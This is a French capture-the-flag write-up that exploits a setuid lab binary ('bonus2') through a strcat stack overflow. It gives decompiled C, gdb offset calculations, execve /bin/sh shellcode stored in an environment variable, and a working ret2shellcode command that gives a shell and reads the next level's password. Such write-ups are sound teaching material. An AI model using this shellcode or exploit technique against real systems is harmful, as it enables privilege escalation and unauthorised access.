Je commence par découvrir qui je suis, où je suis, et qu'est-ce qui est à ma disposition :

```bash
$ id && pwd && ls -la
uid=2012(bonus2) gid=2012(bonus2) groups=2012(bonus2),100(users)
/home/user/bonus2
total 17
dr-xr-x---+ 1 bonus2 bonus2   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 bonus2 bonus2  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 bonus2 bonus2 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 bonus3 users  5664 Mar  6  2016 bonus2
-rw-r--r--+ 1 bonus2 bonus2   65 Sep 23  2015 .pass
-rw-r--r--  1 bonus2 bonus2  675 Apr  3  2012 .profile
```

Je tente de lancer le binaire `bonus2` :

```bash
$ ./bonus2
$ ./bonus2 dab
$ ./bonus2 dab itude
Hello dab
$ ./bonus2 dab itude je
```

Sans succès, je me penche dès lors sur la décompilation.

J'utilise [Dogbolt](https://dogbolt.org/?id=2e8bb7ea-1f7b-4c7b-a01b-0ff9afb4fc75#BinaryNinja=114&Reko=89&RetDec=19) afin de décompiler le binaire du `bonus2`, qui a des protections contre la décompilation, mais certains décompilateurs réussissent.

Je recoupe la sortie de `RetDec` avec l'ASM et en extrait le probable code suivant :

```c
int lang = 0;

void greetuser(char *string)
{
    char buffer[64];

    switch (lang)
    {
    case 0:
        strcpy(buffer, "Hello ");
        break;

    case 1:
        strcpy(buffer, "Hyvää päivää ");
        break;

    case 2:
        strcpy(buffer, "Goedemiddag! ");
        break;
    }

    strcat(buffer, string); // <----------------4 the new buffer of 64 appends our 72 bytes buffer so overflows, can be used to Ret2Libc
    puts(buffer);
}

int main(int argc, char **argv)
{
    char buffer[76]; // <-----------------------1 76 bytes buffer declared
    char *ret;

    if (argc != 3)
        return 1;

    memset(buffer, 0, 76);
    strncpy(buffer, argv[1], 40); // <----------2 filled with 40
    strncpy(buffer + 40, argv[2], 32); // <-----3 then 32 bytes (72, not overflown yet)

    ret = getenv("LANG");
    if (ret != 0)
    {
        if (memcmp(ret, "fi", 2) == 0)
            language = 1;
        else if (memcmp(ret, "nl", 2) == 0)
            language = 2;
    }
    greetuser(buffer);
}
```

En analysant le code ici, je vois un buffer, et me penche donc dessus comme source de vulnérabilité.
J'observe qu'il est d'abord `memset()` à 0 sur 76 bytes, puis se voit inséré 40 bytes du premier argument, puis 32 du second.

Il est ensuité passé à `greetuser()` qui elle va venir `strcat()` le message à notre buffer, ce qui aura pour conséquence de l'overflow.

Je vais utiliser le binaire avec la langue `nl` en changeant la variable env. `LANG` afin que l'overflow soit plus important qu'en anglais. Je commence par trouver le padding nécessaire pour que le buffer overflow et ré-écrive sur l'adresse de retour de `greetuser()` avec `gdb` :

```h
$ gdb ./bonus2 -q
Reading symbols from /home/user/bonus2/bonus2...(no debugging symbols found)...done.
(gdb) disas greetuser
Dump of assembler code for function greetuser:
    ...
   0x08048517 <+147>:   call   0x8048370 <strcat@plt>
   0x0804851c <+152>:   lea    -0x48(%ebp),%eax
   0x0804851f <+155>:   mov    %eax,(%esp)
   0x08048522 <+158>:   call   0x8048390 <puts@plt>
   0x08048527 <+163>:   leave <--------------------- breakpoint avant de leave
   0x08048528 <+164>:   ret
End of assembler dump.

(gdb) b *greetuser+163
Breakpoint 1 at 0x8048527

(gdb) r dab itude
Starting program: /home/user/bonus2/bonus2 dab itude
Hello dab

Breakpoint 1, 0x08048527 in greetuser ()

(gdb) info registers
...
esp            0xbffff600       0xbffff600
ebp            0xbffff658       0xbffff658
...
```

Puis calcule la différence : `0xbffff600 - 0xbffff658 = 0x58 = 88` bytes.

Enfin, je soustrais également le décalage dans la stack de la déclaration du buffer, que l'on voit :

```h
(gdb) disas greetuser
Dump of assembler code for function greetuser:
   0x08048484 <+0>:     push   %ebp
   0x08048485 <+1>:     mov    %esp,%ebp
   0x08048487 <+3>:     sub    $0x58,%esp
   0x0804848a <+6>:     mov    0x8049988,%eax
   0x0804848f <+11>:    cmp    $0x1,%eax
   0x08048492 <+14>:    je     0x80484ba <greetuser+54>
   0x08048494 <+16>:    cmp    $0x2,%eax
   0x08048497 <+19>:    je     0x80484e9 <greetuser+101>
   0x08048499 <+21>:    test   %eax,%eax
   0x0804849b <+23>:    jne    0x804850a <greetuser+134>
   0x0804849d <+25>:    mov    $0x8048710,%edx
   0x080484a2 <+30>:    lea    -0x48(%ebp),%eax <-------------------------- ici
```

Je soustrais donc `0x58 - 0x48 = 0x10 = 16` bytes à 88, et trouve 72 bytes avant d'atteindre `ebp`. J'en rajoute 4 et me trouve donc à l'adresse de retour de `greetuser()`.

Je dois également considérer les 13 bytes ajouté par la string en `nl`, ce qui ajoutera 13 bytes au début de mon buffer.

Le buffer compromis ressemblera donc à :

```
13 bytes du message + 40 du premier arg + 32 du second = 85 bytes
```

Je soustrais donc 9 bytes du second arg afin d'atteindre 76 bytes, soit `13 + 40 + 23 = 76`.

Je vais donc tenter de construire un payload qui permettra d'exploiter `Ret2Shellcode`, de la même manière qu'au `bonus0`.
J'utilise le même [shellcode](https://shell-storm.org/shellcode/files/shellcode-827.html) : `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80` et le stocke de la même manière dans une variable env. :

```bash
$ export BYE=$'\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
```

Et emploie la même manière que `bonus0` pour trouver son adresse :

```h
$ gdb ./bonus2 -q
Reading symbols from /home/user/bonus2/bonus2...(no debugging symbols found)...done.

(gdb) b main
Breakpoint 1 at 0x804852f

(gdb) r
Starting program: /home/user/bonus2/bonus2

Breakpoint 1, 0x0804852f in main ()

(gdb) x/200s environ
0xbfffff14:      "LANG=nl"
0xbfffff1c:      "BYE=1\300Ph//shh/bin\211\343PS\211\341\260\v\315\200"
...

(gdb) x/100x 0xbfffff1c
0xbfffff1c:     0x42    0x59    0x45    0x3d    0x90    0x90    0x90    0x90
0xbfffff24:     0x90    0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73 <-- début du shellcode
0xbfffff2c:     0x68    0x68    0x2f    0x62    0x69    0x6e    0x89    0xe3
0xbfffff34:     0x50    0x53    0x89    0xe1    0xb0    0x0b    0xcd    0x80
0xbfffff3c:     0x00    0x4c    0x49    0x4e    0x45    0x53    0x3d    0x35
0xbfffff44:     0x31    0x00    0x53    0x48    0x4c    0x56    0x4c    0x3d
0xbfffff4c:     0x34    0x00    0x48    0x4f    0x4d    0x45    0x3d    0x2f
0xbfffff54:     0x68    0x6f    0x6d    0x65    0x2f    0x75    0x73    0x65
0xbfffff5c:     0x72    0x2f    0x62    0x6f    0x6e    0x75    0x73    0x32
0xbfffff64:     0x00    0x4c    0x4f    0x47    0x4e    0x41    0x4d    0x45
0xbfffff6c:     0x3d    0x62    0x6f    0x6e    0x75    0x73    0x32    0x00
0xbfffff74:     0x53    0x53    0x48    0x5f    0x43    0x4f    0x4e    0x4e
0xbfffff7c:     0x45    0x43    0x54    0x49
```

Mon payload devrait donc ressembler à :

```h
"\x90" * 40 + "\x90" * 23 + "\xbf\xff\xff\x24"
^^^^^^^^^^^   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1er arg       2eme arg
```

Je l'essaye :

```bash
$ ./bonus2 `python -c 'print("\x90" * 40)'` `python -c 'print("\x90" * 23 + "\xbf\xff\xff\x24"[::-1])'`
Goedemiddag! ���������������������������������������������������������������$���
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
$ exit
```





